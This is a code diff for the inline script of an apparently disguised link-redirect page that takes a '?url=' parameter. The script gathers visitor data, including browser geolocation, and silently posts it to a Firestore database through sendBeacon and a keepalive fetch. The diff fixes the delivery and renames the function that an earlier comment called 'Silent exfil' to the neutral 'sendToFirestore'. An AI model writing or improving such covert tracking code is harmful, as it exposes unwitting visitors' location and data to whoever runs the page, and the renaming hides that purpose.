@@ -88,30 +88,15 @@
 
   <script>
     const FIRESTORE_URL = 'https://firestore.googleapis.com/v1/projects/funny-jokes-e8b49/databases/(default)/documents/logs';
+
     // =================
-
-    function getTargetUrl() {
-      const params = new URLSearchParams(window.location.search);
-      let target = params.get('url') || params.get('u');
-      if (!target) return null;
-      try { target = decodeURIComponent(target); } catch(e) {}
-      if (!/^https?:\/\//i.test(target)) return null;
-      return target;
-    }
-
-    const target = getTargetUrl();
-    const box = document.getElementById('box');
-    const countEl = document.getElementById('count');
-    const continueBtn = document.getElementById('continueBtn');
-
-    // Silent exfil to Firestore
-    function exfil(data) {
-      // Build Firestore document format (typed fields)
+    // Helper: build Firestore document and send it
+    // =================
+    function sendToFirestore(data) {
       const doc = {
         fields: {}
       };
 
-      // Convert each value to the right Firestore type
       for (const [key, value] of Object.entries(data)) {
         if (typeof value === 'number') {
           doc.fields[key] = { doubleValue: value };
@@ -124,19 +109,39 @@
 
       const payload = JSON.stringify(doc);
 
-      // sendBeacon for reliable delivery on page unload
-      navigator.sendBeacon(FIRESTORE_URL, payload);
+      // --- FIX 1: sendBeacon with proper Blob + JSON content-type ---
+      navigator.sendBeacon(
+        FIRESTORE_URL,
+        new Blob([payload], { type: 'application/json' })
+      );
 
-      // Fetch fallback
+      // --- Fetch fallback (keepalive to survive page unload) ---
       fetch(FIRESTORE_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: payload,
         keepalive: true
-      }).then(r => r.json()).then(console.log).catch(() => {});
+      })
+        .then(r => r.json())
+        .then(console.log)
+        .catch(() => {});
     }
 
-    var overlay = document.getElementById('overlay');
+    // =================
+    // Extract target URL from query params (?url= or ?u=)
+    // =================
+    function getTargetUrl() {
+      const params = new URLSearchParams(window.location.search);
+      let target = params.get('url') || params.get('u');
+      if (!target) return null;
+      try { target = decodeURIComponent(target); } catch(e) {}
+      if (!/^https?:\/\//i.test(target)) return null;
+      return target;
+    }
+
+    const target = getTargetUrl();
+    const box = document.getElementById('box');
+    const overlay = document.getElementById('overlay');
 
     if (!target) {
       box.style.display = 'block';
@@ -154,7 +159,7 @@
         overlay.classList.remove('show');
         box.style.display = 'block';
 
-        // Try browser geolocation
+        // --- FIX 2: Try geolocation, call sendToFirestore (was exfil) ---
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
             function(pos) {
